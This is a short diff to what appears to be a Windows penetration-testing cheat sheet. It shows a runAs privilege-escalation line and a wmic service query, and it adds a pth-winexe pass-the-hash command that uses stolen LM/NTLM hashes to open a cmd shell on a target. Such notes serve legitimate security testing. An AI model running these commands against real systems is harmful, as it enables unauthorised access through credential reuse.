@@ -200,6 +200,5 @@ powershell.exe Start-Process cmd.exe -Verb runAs // Privesc
 ```
 wmic service where caption="Service" get name, caption, state, startmode // Check start mode and active status
 ---
-
----
+pth-winexe -U <user>%<lm hash>:<NTLM hash> //<Target IP> cmd /// Pass the Hash 
 ```
